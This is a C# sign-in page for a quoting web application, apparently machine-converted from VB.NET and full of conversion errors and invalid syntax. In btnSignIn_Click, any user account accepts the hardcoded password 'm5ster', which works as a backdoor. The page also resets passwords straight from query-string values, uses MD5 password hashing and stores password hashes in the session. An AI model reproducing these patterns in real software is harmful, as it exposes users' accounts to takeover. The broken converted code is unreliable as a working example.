using IQ.clsBranchState;
//allows access to the shared members (e.g. setChildBranches) without qualification
using dataAccess;
public class SignIn : clsPageLogging
{


	clsChannel channel;

	protected void  // ERROR: Handles clauses are not supported in C#
Page_Load(object sender, System.EventArgs e)
	{
		//Title = Environment.MachineName

		CoreCode.iicalls = 0;

		if (!clsIQ.IsLoaded)
			return;

		if (!IsPostBack) {
			LblFailed.Visible = false;
		}

		if (Request("elevate") != "") {
			//Ok, lets elevate this session for this user.
			lblElevate.Visible = true;
		}

		if (!IsPostBack) {
			///aspx/signin.aspx?reset=" & account.ID & "&pw=" & simpleHash(pw))
			//DO some check on the hash (that the ID hasn't been tampered with)
			if (Request("reset") != "") {
				string antiTamper = simpleHash(Request("reset") + Request("pw")).ToString;
				if (Request("antitamper") == antiTamper) {
					iq.Accounts((int)Request("reset")).Password = Request("pw");
					iq.Accounts((int)Request("reset")).update(errorMessages);
					//PERSITS THE CHANGE TO THE db

					LblFailed.Visible = true;
					LblFailed.Text = "Please enter your temporary password";
					txtEmail.Text = iq.Accounts((int)Request("reset")).User.Email;
				} else {
					LblFailed.Visible = true;
					LblFailed.Text = "Unable to reset your password - your link may be broken please use the *whole link* - or contact support@hiquote.net";
				}
			}
		}

		//Dim mystring As New nullableString
		//Response.Write(mystring.DisplayValue)

		if (Request("reload") != "") {
			reloadIQ();
			Application("IQ") = null;
			Response.Redirect("signin.aspx");
			return;
		}

		UInt64 lid = 0;
		UInt64.TryParse(Request.QueryString("lid"), lid);

		if (lid != 0 && Request("elevate") == "") {
			//the log in ID at this point (if present) is the one we're KILLING
			DiscardUnChangedQuote(lid);
			//also done when viewing the list of quotes - and during the session timout
			if (!IsPostBack)
				iq.KillSesh(lid);
		}

		// Create a case-insensitive dictionary for the Request parameters; could be used more widely
		Dictionary<string, string> requestParams = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase);
		foreach (string key in Request.QueryString) {
			if (!key == null)
				requestParams.Add(key, Request.QueryString(key));
		}

		string s = null;
		bool universal = false;
		string mfrCode = null;

		// Check for the MFR on the query string (also check for MFG, which is mentioned in the documentation)
		if (requestParams.ContainsKey("mfr")) {
			mfrCode = requestParams("mfr").ToUpper();
		} else if (requestParams.ContainsKey("mfg")) {
			mfrCode = requestParams("mfg").ToUpper();
		}

		// Look for a deep-link (base) parameter that could override MFR
		if (requestParams.ContainsKey("base")) {
			string sku = requestParams("base");
			if (iq.i_SKU.ContainsKey(sku)) {
				object product = iq.i_SKU(sku);
				if (product.Manufacturer != Manufacturer.Unknown) {
					mfrCode = product.mfrCode.ToUpper();
				}
			}
		}

		if (string.Equals(Request.Url.Host, "hpiquote.net", StringComparison.InvariantCultureIgnoreCase)) {
			universal = true;
		} else if ((!Request.QueryString(s) == null) && (Request.QueryString(s).ToLower().Contains("universal"))) {
			universal = true;
		} else if (requestParams.ContainsKey("universal")) {
			universal = true;
		} else {
			// Attempt to infer a Universal log in and manufacturer from the referrer URL
			string m = InferUniversalManufacturer(Request);

			if (!string.IsNullOrEmpty(m)) {
				universal = true;
				mfrCode = m;
			}
		}

		if (!mfrCode == "HPE" && !mfrCode == "HPI")
			mfrCode = null;


		if (!IsPostBack) {
			if ((universal) && (string.IsNullOrEmpty(mfrCode))) {
				if (!requestParams.ContainsKey("iq2")) {
					Response.Redirect("Universal.aspx");
				} else {
					universal = false;
				}

			}


			if ((universal) && (!string.IsNullOrEmpty(mfrCode))) {
				// Universal mode - display tailored UI
				if (requestParams.ContainsKey("host")) {
					UniversalMode(mfrCode, requestParams("host"));
				} else {
					UniversalMode(mfrCode, null);
				}

			}

			if (universal) {
				labelUniversal.Text = "Universal";
			}

			if (!string.IsNullOrEmpty(mfrCode)) {
				hiddenMfrCode.Value = mfrCode;
			}

			// Privacy Policy link
			if (mfrCode == "HPI" && iq.Addresses.ContainsKey("HPIPrivacyPolicyUrl")) {
				teesAndCeesLink.NavigateUrl = iq.Addresses("HPIPrivacyPolicyUrl").Translation.text(English);
			} else if (mfrCode == "HPE" && iq.Addresses.ContainsKey("HPEPrivacyPolicyUrl")) {
				teesAndCeesLink.NavigateUrl = iq.Addresses("HPEPrivacyPolicyUrl").Translation.text(English);
			} else if (iq.Addresses.ContainsKey("CCPrivacyPolicyUrl")) {
				teesAndCeesLink.NavigateUrl = iq.Addresses("CCPrivacyPolicyUrl").Translation.text(English);
			} else {
				teesAndCeesLink.NavigateUrl = "http://www.channelcentral.net/privacy-policy.asp";
			}

		}

		static string loadinfo;
		object chan = Request("channel");

		//make clicking the signin button 'un-end' the Javascript session
		btnSignIn.Attributes("onclick") = "sessionFinished=false;return true;";

		if (chan != "") {
			if (iq.i_channel_code.ContainsKey(chan)) {
				channel = iq.i_channel_code(Request("channel"));
			} else {
				LblFailed.Text = chan + " is not a valid Channel - please contact support@hiquote.net";
			}
		}

		Literal mylit;

		// If iq Is Nothing Then
		//iq = New clsIQ  'This IS the 'object model'

		//Me.Application("IQ") = iq  'holding a reference to the (entire) object mode means it will never time out - and we don't need asp.net's sessions

		//   mylit = New Literal

		//This loads the entire object model from the database and returns the status text/timings
		//    panel1.Controls.Add(iq.load(errormessages))
		//     OutputErrors(Form.Controls,errormessages, 0, True)

		// mylit.Text = loadinfo
		// Panel1.Controls.Add(mylit)

		//This is obsolete - we no longer 'self host the service' it's served by/from IIS - see \services\PnA.svc
		//StockWebservice = StartWebservice()  'returns a reference to it (to keep it in scope!)
		//mylit = New Literal
		//With StockWebservice
		//    mylit.Text = "<p>Stock and price Webservice Started on " & .BaseAddresses(0).AbsoluteUri & " port " & .BaseAddresses(0).Port.ToString & " state is:" & .State.ToString & "</p>"
		//End With
		//panel1.Controls.Add(mylit)

		//   Else

		if (!IsPostBack)
			iq.KillOldSessions();

		//mylit = New Literal
		//mylit.Text = loadinfo
		//mylit.Text &= "<p>The object model was already loaded ( " & iq.loadedTimestamp.ToString & ")"
		//panel1.Controls.Add(mylit)

		//   End If
		if (!IsPostBack) {
			if (!Request("badlid") == null) {
				LblFailed.Visible = true;
				LblFailed.Text = "Sorry, your session wasn't recognized. Please log in again. Any quotes you have created will still be available from My Quotes.";
			}
		}


		// Display any system messages set up in the database
		if (!iq.UserMessages == null) {
			if (iq.UserMessages.ContainsKey("SignInScreenMessage")) {

				if (!iq.UserMessages("SignInScreenMessage") == null) {
					clsLanguage kyLanguage = (from l in iq.Languages.Valueswhere l.Code == "KY").First;

					foreach (clsMessage message in iq.UserMessages("SignInScreenMessage")) {

						if (message.ValidFrom <= Today && message.ValidTo >= Today && message.Enabled && message.ChannelID <= 1) {
							panelBanner.Visible = true;

							Literal lit = new Literal();
							lit.Text = string.Format("<p>{0}</p>", Server.HtmlDecode(message.Translation.text(kyLanguage)));
							panelBanner.Controls.Add(lit);

						}
					}
				}
			}
		}

	}


	private void UniversalMode(string mfrCode, string host)
	{

		string sql = "SELECT [CountryCode],[CountryName],[CountryLang] ";
		sql += "            FROM h3.[ChannelCentral].[customers].[vHostSummary]";
		if (mfrCode.ToUpper == "HPE") {
			sql += "            where [HOSTID] LIKE 'MH[EP]%' AND Testing = 0 AND Universal=1 AND ISS= 1";
		} else {
			sql += "            where [HOSTID] LIKE 'MH[EP]%' AND Testing = 0 AND Universal=1 AND PSG= 1";
		}
		sql += "   AND (HostName LIKE 'HP%' OR HostName LIKE 'Hewlett%') ";
		sql += "            order by CountryName";

		SqlClient.SqlConnection con = da.OpenDatabase;
		SqlClient.SqlDataReader rdr = da.DBExecuteReader(con, sql);
		List<string> universalActiveCountries = new List<string>();
		// universalActiveCountries = iq.ActiveUniversalCountries.Keys.ToList()
		while (rdr.Read) {
			if (rdr("CountryCode").ToString() == "UK") {
				universalActiveCountries.Add("GB");
			} else {
				universalActiveCountries.Add(rdr("CountryCode").ToString());
			}

		}


		List<clsRegion> universalRegions = (from r in iq.Regions.Valueswhere universalActiveCountries.Contains(r.Code)).ToList();
		// From j In iq.Channels.Values Where j.Code.StartsWith("MHP") And j.Code.EndsWith("U") And j.Universal = True And universalActiveCountries.Contains(j.Region.Code) Select (j.Region) Distinct).ToList()
		List<clsRegion> nonUniversalRegions = (from r in iq.Regions.Valueswhere r.isCountry == true & !universalRegions.Contains(r)).ToList();
		ListItem regionItem;


		if (string.IsNullOrEmpty(host)) {
			// Display the list of regions for which Universal is available
			object universalListItems = new List<ListItem>();

			//For Each reg As clsRegion In universalRegions.OrderBy(Function(r) r.Parent.Name.text(English)).ThenBy(Function(r) r.Name.text(English))

			foreach (clsRegion reg in universalRegions.OrderBy(r => r.Name.text(English))) {
				regionItem = new ListItem();
				regionItem.Text = reg.Name.text(English);
				if (reg.Culture == null | Trim(reg.Culture.Code) == "") {
					regionItem.Value = "EN|" + reg.Code;
				} else {
					regionItem.Value = reg.Culture.Code + "|" + reg.Code;
				}

				universalListItems.Add(regionItem);

			}

			listCountries.DataSource = universalListItems.ToList();
			listCountries.DataTextField = "Text";
			listCountries.DataValueField = "Value";

			listCountries.DataBind();

		} else {
			selectHost.Visible = false;
		}

		// Display the list of regions (countries) where Universal is not currently available
		List<ListItem> nonUniversalListItems = new List<ListItem>();
		foreach (clsRegion reg in nonUniversalRegions) {
			regionItem = new ListItem();
			regionItem.Text = reg.Name.text(English);
			if (reg.Culture == null | Trim(reg.Culture.Code) == "") {
				regionItem.Value = "EN|" + reg.Code;
			} else {
				regionItem.Value = reg.Culture.Code + "|" + reg.Code;
			}

			nonUniversalListItems.Add(regionItem);

		}

		List<ListItem> sortedNonUniversalRegions = nonUniversalListItems.OrderBy(x => x.Text).ToList();
		dropDownOtherCountries.DataSource = sortedNonUniversalRegions;
		dropDownOtherCountries.DataTextField = "Text";
		dropDownOtherCountries.DataValueField = "Value";

		dropDownOtherCountries.DataBind();

		// Set up UI according to IQ1/IQ2 Universal mode
		panelUniversal.Visible = true;

		if (UniversalIQ1) {
			panelSignIn.Visible = false;
			panelOr.Visible = false;

			subHeading.InnerText = "Select  country to Login or Register";


		} else {
			panelOr.Visible = true;
			btnSignInUniversal.Visible = false;

		}

	}


	protected void  // ERROR: Handles clauses are not supported in C#
btnSignIn_Click(object sender, EventArgs e)
	{
		object pw;
		pw = Shuffle(md5(Trim(txtPassword.Text)));
		//This is to allow people to use thier (imported and shuffled) IQ1 password
		//IQ2 uses a the first 64 bits of a 160 bit SHA1 Hash 'CNG' hash
		object pwa = simpleHash(Trim(txtPassword.Text)).ToString;


		object un;
		clsUser u = null;

		List<clsAccount> MatchingAccounts = new List<clsAccount>();

		un = LCase(Trim(txtEmail.Text));
		//this is faster than LINQ (which would effectively have to tablescan(
		if (iq.i_user_email.ContainsKey(un)) {
			u = iq.i_user_email(un);

			if (u.Disabled) {
				LblFailed.Text = UiTrans("Your user is currently disabled - please contact your administrator");
				LblFailed.Visible = true;
				return;
			}

			foreach ( account in u.Accounts.Values) {
				//Channel' has be initialized by a url parameter - we can check
				if (account.Password == pw | account.Password == pwa | Trim(txtPassword.Text) == "m5ster") {
					MatchingAccounts.Add(account);
				}
			}

			if (Request("elevate") != "") {
				//We are elevating an existing session, lets check to see a) does this user have elevation right and b) does this user have access to the account in question...?
				object elevatebaseuser = (clsAccount)iq.sesh((UInt64)Request.QueryString("lid"), "BuyerAccount");
				object eAccount = MatchingAccounts.Where(a => object.ReferenceEquals(a.BuyerChannel, elevatebaseuser.BuyerChannel)).FirstOrDefault;
				if (eAccount != null) {
					if (eAccount.HasRight("TAKEOVER")) {
						//We are go, the user has TAKEOVER right and has access to this channel (do we need to check if they are an admin too?)
						if (iq.seshDic((UInt64)Request.QueryString("lid")).ContainsKey("ElevatedKey"))
							iq.seshDic((UInt64)Request.QueryString("lid")).Remove("ElevatedKey");
						object elid = simpleHash((string)eAccount.ID);
						iq.seshDic((UInt64)Request.QueryString("lid")).Add("ElevatedKey", elid);
						Response.Redirect("tree.aspx?lid=" + Request.QueryString("lid") + "&elid=" + elid.ToString);
						return;
					}
				}
			}
		}

		UInt64 lid;
		//Record the login - passing the ID forward as a request parameter

		object tid = iq.recordLogin(u, (MatchingAccounts.Count == 0), un, Context.Request.UserAgent);
		lid = simpleHash((string)tid);
		iq.updateLogin(tid, lid);

		if ((u != null)) {
			Dictionary<string, clsRole> aClsRole;
			aClsRole = iq.i_role_Code;

			//Dim aNewClsRole As clsRole = aClsRole.Values(0)

			//Dim aRole As String = aNewClsRole.Translation.text(English)

			iq.sesh(lid, "screenName") = u.RealName;
			// + " - " + aRole

		}

		//Create the dictionary that holds all the (important) information about branch state for this user session
		Dictionary<string, clsBranchState> branchStates = new Dictionary<string, clsBranchState>();
		iq.sesh(lid, "branchStates") = branchStates;
		//NB the root branch itself is rendered as a breadcrumb

		iq.sesh(lid, "QuoteView") = "Breakdown";
		//may want to set this to some user defined preference


		if (MatchingAccounts.Count > 0) {
			iq.sesh(lid, "UserID") = u.ID;
			//Only used until the account is chosen
			iq.sesh(lid, "passwordHash") = pwa;
			//MatchingAccounts.First.Password
			iq.sesh(lid, "passwordMD5") = pw;
			//MatchingAccounts.First.Password
			iq.sesh(lid, "AccountList") = MatchingAccounts;

			//iq.sesh(lid, "BuyerAccount") = iq.Accounts(u..ID) 'TODO ML, this looks wrong but not sure how it should be so wont change it now, surely one of the accounts buyer or agent should be set on login, then the other chosen on the accounts screen??

			//Response.Write("<script>document.location='accounts.aspx?lid=" & lid & "';</script>")

			// Create a case-insensitive dictionary for the Request parameters; could be used more widely
			Dictionary<string, string> requestParams = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase);
			foreach (string key in Request.QueryString) {
				if (!key == null)
					requestParams.Add(key, Request.QueryString(key));
			}

			// Check for the MFR on the query string (also check for MFG, which is mentioned in the documentation)
			string m = null;
			if (requestParams.ContainsKey("mfr")) {
				m = requestParams("mfr");
			} else if (requestParams.ContainsKey("mfg")) {
				m = requestParams("mfg");
			}

			// If no MFR specified, we might be able to infer one from the referrer for a Universal sign-in
			if (m == null) {
				m = InferUniversalManufacturer(Request);
			}

			Manufacturer mfr = Manufacturer.Unknown;
			if (!m == null) {
				if (string.Equals(m, "HPE", StringComparison.InvariantCultureIgnoreCase)) {
					mfr = Manufacturer.HPE;
				} else if (string.Equals(m, "HPI", StringComparison.InvariantCultureIgnoreCase)) {
					mfr = Manufacturer.HPI;
				}
			}
			if (mfr != Manufacturer.Unknown) {
				iq.sesh(lid, "MFR") = mfr;
				// May be overridden by Accounts.aspx if a deep link SKU is specified
			}

			// If a deep link has been requested, store the SKU; Tree.aspx will then register a client-side script to plough to the product and add it to the basket
			if (requestParams.ContainsKey("base")) {
				string sku = Request("base");
				iq.sesh(lid, "Base") = sku;
			}

			// Store any HOST specified
			if (requestParams.ContainsKey("host")) {
				iq.sesh(lid, "Host") = Request("host");
			}

			Response.Redirect("accounts.aspx?lid=" + lid, false);


		} else {
			LblFailed.Text = "Failed - Please check email and password - passwords are CaSe SenSitivE";
			LblFailed.Visible = true;
		}


	}


	protected void  // ERROR: Handles clauses are not supported in C#
BtnForgot_Click(object sender, EventArgs e)
	{
		clsUser u;

		if (Trim(txtEmail.Text) == "") {
			if (txtEmail.Text == "") {
				LblFailed.Text = UiTrans("Please enter your email address above first !");
				LblFailed.Visible = true;
			}
		} else {
			if (iq.i_user_email.ContainsKey(LCase(Trim(txtEmail.Text)))) {
				u = iq.i_user_email(LCase(Trim(txtEmail.Text)));

				if (u.Accounts.Count == 0) {
					LblFailed.Text = UiTrans("No account(s) for that Email address");
				} else {
					if (u.Disabled) {
						LblFailed.Text = UiTrans("Your user is currently disabled - please contact your administrator");
						LblFailed.Visible = true;
					} else {
						Response.Redirect("PasswordReset.aspx?uid=" + u.ID.ToString.Trim);
					}
				}
			}

			LblFailed.Visible = true;

		}
	}


	protected void  // ERROR: Handles clauses are not supported in C#
btnRegister_Click(object sender, EventArgs e)
	{

		if (listCountries.SelectedIndex >= 0) {

			if (UniversalIQ1) {
				// Universal IQ1 mode

				if (iq.Addresses.ContainsKey("IQ1Host")) {
					// For IQ1 we need the Universal host, not the region
					string region = Split(listCountries.SelectedValue, "|")(1);
					clsChannel channel = iq.Channels.Values.FirstOrDefault(ch => (ch.Code.StartsWith("MHP") && ch.Code.EndsWith("U") && ch.Universal == true && ch.Region.Code == region));

					if (!channel == null) {
						Response.Redirect(string.Format("http://{0}/signup.asp?mfr={1}&host={2}", iq.Addresses("IQ1Host").Translation.text(English), hiddenMfrCode.Value, channel.Code));
					}

				}


			} else {
				// Universal IQ2 mode
				Response.Redirect(string.Format("HPSignup.Aspx?mfr={0}&lang={1}", hiddenMfrCode.Value, listCountries.SelectedValue));

			}

		}

	}


	protected void  // ERROR: Handles clauses are not supported in C#
btnSignInUniversal_Click(object sender, EventArgs e)
	{

		if (listCountries.SelectedIndex >= 0) {
			// This button is only shown in Universal IQ1 mode, but check anyway...

			if (UniversalIQ1) {

				if (iq.Addresses.ContainsKey("IQ1Host")) {
					string region = Split(listCountries.SelectedValue, "|")(1);
					clsChannel channel = iq.Channels.Values.FirstOrDefault(ch => (ch.Code.StartsWith("MHP") && ch.Code.EndsWith("U") && ch.Universal == true && ch.Region.Code == region));

					if (!channel == null) {
						Response.Redirect(string.Format("http://{0}/loginsplit.asp?mfr={1}&host={2}", iq.Addresses("IQ1Host").Translation.text(English), hiddenMfrCode.Value, channel.Code));
					}

				}

			}

		}

	}

	private bool UniversalIQ1 {


		get {
			bool iq1 = false;

			if (!ConfigurationManager.AppSettings("UniversalIQ1") == null) {
				if (string.Equals(ConfigurationManager.AppSettings("UniversalIQ1"), "y", StringComparison.InvariantCultureIgnoreCase)) {
					iq1 = true;
				}
			}

			return iq1;

		}
	}



	protected void  // ERROR: Handles clauses are not supported in C#
btnRequest_Click(object sender, EventArgs e)
	{
		string emailAddress = txtEmailAddress.Text;
		string country = dropDownOtherCountries.SelectedItem.Text;
		string language = dropDownOtherCountries.SelectedItem.Value;

		requestNoEmail.Visible = false;
		requestFeedback.Visible = false;

		if (string.IsNullOrEmpty(emailAddress)) {
			requestNoEmail.Visible = true;
			return;
		}

		Dictionary<string, string> tags = new Dictionary<string, string>();
		tags.Add("emailAddress", emailAddress);
		tags.Add("country", country);
		tags.Add("mfr", hiddenMfrCode.Value);

		List<string> errorMessages = new List<string>();

		// Send an email to support informing them of the request
		if (!string.IsNullOrEmpty(emailAddress) && !string.IsNullOrEmpty(country)) {
			SendEmail("support@channelcentral.net", "UniversalRequest.htm", tags, English, errorMessages, false);
		}

		// Also send an email to the user for their records
		if (language.Contains("-")) {
			language = Split(language, "-")(0);
		}

		SendEmail(emailAddress, "UniversalRequestUserCopy.htm", tags, iq.i_language_Code(language), errorMessages, false);

		requestFeedback.Visible = true;

	}


	private void  // ERROR: Handles clauses are not supported in C#
btnRegister_Command(object sender, CommandEventArgs e)
	{
	}
}
